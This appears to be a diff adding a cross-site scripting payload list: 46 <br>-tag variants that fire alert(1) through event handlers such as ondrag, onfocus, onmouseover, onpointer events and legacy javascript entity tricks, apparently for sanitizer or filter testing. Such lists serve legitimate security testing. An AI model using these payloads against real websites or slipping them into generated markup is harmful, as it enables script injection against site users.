@@ -1,0 +1,46 @@
+<br draggable="true" ondrag="alert(1)">test</br>
+<br draggable="true" ondragend="alert(1)">test</br>
+<br draggable="true" ondragenter="alert(1)">test</br>
+<br draggable="true" ondragleave="alert(1)">test</br>
+<br draggable="true" ondragstart="alert(1)">test</br>
+<br id=x tabindex=1 onactivate=alert(1)></br>
+<br id=x tabindex=1 onbeforeactivate=alert(1)></br>
+<br id=x tabindex=1 onbeforedeactivate=alert(1)></br><input autofocus>
+<br id=x tabindex=1 ondeactivate=alert(1)></br><input id=y autofocus>
+<br id=x tabindex=1 onfocus=alert(1)></br>
+<br id=x tabindex=1 onfocusin=alert(1)></br>
+<br onafterscriptexecute=alert(1)><script>1</script>
+<br onbeforecopy="alert(1)" contenteditable>test</br>
+<br onbeforecut="alert(1)" contenteditable>test</br>
+<br onbeforepaste="alert(1)" contenteditable>test</br>
+<br onbeforescriptexecute=alert(1)><script>1</script>
+<br onblur=alert(1) tabindex=1 id=x></br><input autofocus>
+<br onclick="alert(1)">test</br>
+<br oncontextmenu="alert(1)">test</br>
+<br oncopy=alert(1) value="XSS" autofocus tabindex=1>test
+<br oncut=alert(1) value="XSS" autofocus tabindex=1>test
+<br ondblclick="alert(1)" autofocus tabindex=1>test</br>
+<br onfocusout=alert(1) tabindex=1 id=x></br><input autofocus>
+<br onkeydown="alert(1)" contenteditable>test</br>
+<br onkeypress="alert(1)" contenteditable>test</br>
+<br onkeyup="alert(1)" contenteditable>test</br>
+<br onmousedown="alert(1)">test</br>
+<br onmouseenter="alert(1)">test</br>
+<br onmouseleave="alert(1)">test</br>
+<br onmousemove="alert(1)">test</br>
+<br onmouseout="alert(1)">test</br>
+<br onmouseover="alert(1)">test</br>
+<br onmouseup="alert(1)">test</br>
+<br onmousewheel=alert(1)>requires scrolling
+<br onpaste="alert(1)" contenteditable>test</br>
+<br onpointerdown=alert(1)>XSS</br>
+<br onpointerenter=alert(1)>XSS</br>
+<br onpointerleave=alert(1)>XSS</br>
+<br onpointermove=alert(1)>XSS</br>
+<br onpointerout=alert(1)>XSS</br>
+<br onpointerover=alert(1)>XSS</br>
+<br onpointerrawupdate=alert(1)>XSS</br>
+<br onpointerup=alert(1)>XSS</br>
+<BR SIZE="&{javascript:alert(1)}">
+<BR SIZE="&{alert('XSS')}">
+
